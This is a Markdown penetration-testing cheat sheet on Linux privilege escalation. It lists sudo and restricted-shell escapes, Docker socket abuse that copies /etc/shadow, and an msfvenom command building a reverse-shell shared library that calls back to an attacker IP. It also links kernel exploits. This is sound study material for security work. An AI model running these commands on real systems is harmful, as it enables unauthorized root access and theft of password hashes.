# [See Linux Enumeration](../../Enumeration/FromTarget/Linux/README.md)

# SUID Binaries
##### Known SUID Binaries
```bash
/bin/ping
/bin/su
/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
```

# SUDO
##### Common Sudo Binaries to Establish root Shells
```bash
less (!sh)
more (!sh)
Vi/Vim (:!sh)
nmap (--interactive + !sh)
ftp (!sh)
gdb (!sh)
python
Perl
lrb
lua
```
##### Common Sudo Binaries to Execute Commands
```bash
man -P "id" man
man -P "cat /etc/shadow" man
```
##### Docker
[dockerevil](https://github.com/pyperanger/dockerevil)

# Restricted Shells
##### Escape with Vi/Vim
```bash
Vi/Vim (:!sh)
```
##### Escape with Find
```bash
find /home/<Username> -name <Exisiting Filename> -exec /bin/sh \;
# If file exists, it executes the command.
```
##### Escape with Python
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
##### Escape with Perl
```bash
perl -e 'exec "/bin/sh";'
```
##### Escape with SSH
```bash
ssh <Restricted Username>@<Target> -t "/bin/sh"
```
### Restricted Shells References
[Escape Restricted Shell](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22)


# Shared Object Libraries
##### Determine Libraries Loaded by Binary
```bash
ldd <Binary Name>
```
##### Determine if Binary was Compiled with RPATH
```bash
objdump -x <Binary Name> | grep RPATH
```
##### Determine if Binary was Compiled with RUNPATH
```bash
objdump -x <Binary Name> | grep RUNPATH
```
##### Generate Reverse Shell, Shared Object Library
```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> -f elf-so -o <Library Name>
# Transfer to the path indicated in RPATH or RUNPATH.
```

### Shared Object Libraries References
[Static, Shared Dynamic and Loadable Linux Libraries](http://www.yolinux.com/TUTORIALS/LibraryArchives-StaticAndDynamic.html)

[Shared object library loading from writable location](https://www.mozilla.org/en-US/security/advisories/mfsa2013-87/)

[Shared Object Hijacking in Linux (Similar to "DLL Hijacking" in Windows)](https://bugzilla.mozilla.org/show_bug.cgi?id=1184466)

[Command Line Options](https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html)

# Kernel Exploits
### Categories
[Arbitrary Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution)

[Buffer Overflows](https://en.wikipedia.org/wiki/Buffer_overflow)

[Memory Corruption](https://en.wikipedia.org/wiki/Memory_corruption)

[Denial Of Service](https://en.wikipedia.org/wiki/Denial-of-service_attack)

[Race Conditions](https://en.wikipedia.org/wiki/Race_condition)

### PrivEsc Kernel Vulnerabilities
[Dirty Cow](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

[Stack Clash](https://blog.qualys.com/vulnerabilities-threat-research/2017/06/19/the-stack-clash)

[DCCP Double-Free Privilege Escalation](https://www.exploit-db.com/exploits/41458)

[Race Condition Privilege Escalation](https://www.exploit-db.com/exploits/43345)

### [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
```bash
perl Linux_Exploit_Suggester.pl -k <Kernel Version>
```

### Metasploit

### [Kernelpop](https://github.com/spencerdodd/kernelpop)
##### Run from Source
```bash
git clone https://github.com/spencerdodd/kernelpop
cd kernelpop
python kernelpop.py || python3 kernelpop.py
```
##### Run from Binary
```bash
git clone https://github.com/spencerdodd/kernelpop
cd kernelpop
./create_executable.sh
./kernelpop
```

### Kernel Exploits References
[Linux Kernel](https://en.wikipedia.org/wiki/Linux_kernel)

[Arbitrary Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution)

[Buffer Overflows](https://en.wikipedia.org/wiki/Buffer_overflow)

[Memory Corruption](https://en.wikipedia.org/wiki/Memory_corruption)

[Denial Of Service](https://en.wikipedia.org/wiki/Denial-of-service_attack)

[Race Conditions](https://en.wikipedia.org/wiki/Race_condition)

[Dirty Cow](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

[Stack Clash](https://blog.qualys.com/vulnerabilities-threat-research/2017/06/19/the-stack-clash)

[DCCP Double-Free Privilege Escalation](https://www.exploit-db.com/exploits/41458)

[Race Condition Privilege Escalation](https://www.exploit-db.com/exploits/43345)

[Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)

[Kernelpop](https://github.com/spencerdodd/kernelpop)

# UNIX Sockets
### Execute Commands through Docker as root
```bash
# Running Docker as non-root.
docker run -v /etc/shadow:/docker/hashedpasswords -d postgres
docker exec -ti {CONTAINER_ID} bash
# Now running inside of Docker as root.
cat /docker/hashedpasswords > /docker/output.txt
chmod +777 /docker/output.txt
cat /docker/output.txt
```

### UNIX Sockets References
[Docker](https://docs.docker.com/engine/install/linux-postinstall/)

[Docker Tips: about /var/run/docker.sock](https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd)

# References
[LinEnum](https://github.com/rebootuser/LinEnum)

[LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)

[Unix-Privesc-Check](https://pentestmonkey.net/tools/unix-privesc-check)

[Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)